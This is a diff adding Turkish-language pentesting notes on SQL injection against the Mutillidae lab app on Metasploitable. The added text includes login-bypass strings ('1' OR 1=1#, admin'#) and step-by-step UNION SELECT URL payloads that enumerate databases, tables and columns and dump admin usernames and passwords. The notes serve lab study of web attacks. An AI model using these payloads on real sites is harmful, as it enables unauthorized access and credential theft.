@@ -101,7 +101,10 @@
   - [SQL Açığı Arama](#SQL-Açığı-Arama)
   - [SQL Post Methodu](#SQL-Post-Methodu)
   - [Union Select](#Union-Select)
-  - [Veri tabanı-Table Name-Sütun Name-Admin Bilgisi](Veri-tabanı-Table-Name-Sütun-Name-Admin Bilgisi)
+  - [SQL Get ile Veri Tabanı İsmini Öğrenme](#SQL-Get-ile-Veri-Tabanı-İsmini-Öğrenme)
+  - [SQL Get ile Veri Tabanındaki Table Name Bulma](#SQL-Get-ile-Veri-Tabanındaki-Table-Name-Bulma)
+  - [SQL Get ile Veri Tabanındaki Sütun Name Bulma](#SQL-Get-ile-Veri-Tabanındaki-Sütun-Name-Bulma)
+  - [SQL Get ile Admin Bilgilerini Öğrenme](#SQL-Get-ile-Admin-Bilgilerini-Öğrenme)
   - [SQL Map](#SQL-Map)
   - [ZAP](#ZAP)
   - [SQL Enjeksiyonu](#SQL-Enjeksiyonu)
@@ -874,4 +877,101 @@ Varsayılan durumunu kapatıp sadece güvendiğimiz siteleri listeye eklemeliyiz
 
 # SQL
 
-![sqliteonline.com](https://sqliteonline.com/) sitesinden SQL kodlarını deneyebiliriz
+[sqliteonline.com](https://sqliteonline.com/) sitesinden SQL kodlarını deneyebiliriz
+  
+### SQL Kodları
+
+```INSERT INTO demo (id,name,hint) VALUES (18,"james","Guitar");``` Veri tabanına veri eklememizi sağlar
+```DELETE FROM demo WHERE name="james":```: Veri tabanında ```james``` isimine kayıt edilmiş verileri siler
+```UPDATE demo SET id=22 WHERE name="james";```: Veri tabanına ```james``` isimiyle kayıt olan kişini id'sini 22 olarak günceller
+```SELECT*FROM demo WHERE name LIKE "A%";```: Veri tabanında ```A``` ile başlayan verileri listeler
+```SELECT*FROM demo WHERE name LIKE "%A";```: Veri tabanında ```A``` ile biten verileri listeler
+
+### SQL ile Database Görme
+
+1.```mysql -u root -h 123.123.123.123``` 
+2.``` show databases;```
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/3611d2c9af41e40728e0e69b001efc143b37d52a/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2016.52.49.jpeg)
+
+3.```use xxx;``` Hangi veri tabanını kullanıcağımızı seçiyoruz
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/b6e35c92d6127f1862bc60b32309d523776a4295/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2016.57.51.jpeg)
+
+4. Veri tabanına girdikten sonra
+5.```select*from xxx;``` Tablo İçeriğini görürüz
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/7b48c658a89095e242d16d571db0785781f315d1/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2016.57.57%20(1).jpeg)
+
+### Mutillidae İçine SQL Hatası
+
+Mutillidae içine girip create account yapıyoruz ve hata alıyoruz, bu hatayı düzeltmek için
+* 1. Metasploitable makinemize giriyoruz
+* 2. ```sudo nano /var/www/mutullidae/config.ınc``` çalıştırıyoruz
+* 3. Çıkan kodlar içinden ```$dbname=`metasploitable`;``` yerine ```$dbname=`mowasp10`;``` yazıyoruz
+
+### SQL Açığı Arama
+
+Sitemizin login kısmına giriyoruz
+Kullanıcı adımızı yazıp şifre yerine ```'``` koyup çalıştırıyoruz
+Çıkan hata mesajındaki SQL kodunu not alıyoruz
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/11eef15c44bffa70db5dcd339eb1968b8748ae8b/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2011.52.22.jpeg)
+
+Önemli olan kısım
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/d96977bfdb90640b867c91d1a21d5aee92d9b78b/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-31%20at%2011.56.38.jpeg)
+
+Kullanıcı adımızı yazıp şifre yerine ```şifremiz' AND 1=2#``` yazıyoruz ve şifremiz doğru olmasına rağmen giriş yapamıyoruz
+Bu sefer Kullanıcı adımızı yazıp  şifre yerine ```şifremiz' AND 1=1#``` yazıyoruz ve giriş yapabiliyoruz
+
+### SQL Post Methodu
+
+> ## 1. Yöntem
+
+```SELECT*FROM accounts WHERE username='admin' AND password='1' OR 1=1#'``` deniyoruz
+Kullanıcı adı:```admin``` , Şifre:```1' OR 1=1#``` 
+
+> ## 2. Yöntem
+
+```SELECT*FROM accounts WHERE username=admin'# AND password='rastgeleşifre'``` deniyoruz
+Kullanıcı adı:```admin'#``` , Şifre:```herhangibirşifre```
+
+### SQL Get Methodu
+
+1. Siteye giriş yaptıktan sonra ```URL```'yi dğeiştirerek giriş yapmayı deniyoruz
+2. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=james&password=123456&user-info-php-submit-button=View+Account+Details```
+3. ```URL```nin ```&username=admin'%23&``` olarak değiştiriyoruz 
+
+```%23``` html'de ```#``` anlamına geliyor
+
+### SQL Union Select Kodu
+
+1. Admin kullanıcı adını bilmiyorsak veya tüm kullanıcı isimlerini öğrenmek istiyorsak ```union select``` kullanabiliriz
+2. URL kısmına ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select*from account%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz 
+###
+
+### SQL Get ile Veri Tabanı İsmini Öğrenme
+
+1. URL'kısmına ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' order by1%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
+2. ```order by 2``` diyerek tek tek deniyoruz ve kaç sütun olduğunu öğreniyoruz
+3. Kaç sütun olduğunu anlatıktan sonra (varsayalım 5 sütun var)
+4. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, 2, 3, 4, 5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazarak o sütundaki değerleri bastırıyoruz
+5. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, database(), user(), version(),5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
+6. Veritabanı ismini, kullanıcı adını ve linux versiyonunu öğreniyoruz
+
+### 2-SQL Get ile Veri Tabanındaki Table Name Bulma
+
+1. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, table_name, null, null,5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
+2. Bu şekilde tüm table'lları görürüz (sadece owasp10 değil)
+3. Belirli bir veritabanındaki table'lları görmek için ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, table_name, null, null, null,5 from information_schema.tables where table_schema='<veritabanıadı>%23&password=123456&user-info-php-submit-button=View+Account+Details``` 
+
+### SQL Get ile Veri Tabanındaki Sütun Name Bulma
+
+1. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, column_name, null, null,5 from information_schema.columns where table_name='<tabloismi>'%23&password=123456&user-info-php-submit-button=View+Account+Details```
+2. Belirtilen tablodaki sütunları gösterir
+
+### SQL Get ile Admin Bilgilerini Öğrenme
+
+1.```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, username, password, is_admin,5 from account%23&password=123456&user-info-php-submit-button=View+Account+Details```
+2. Admin kullanıcı adlarını ve şifrelerini görürüz
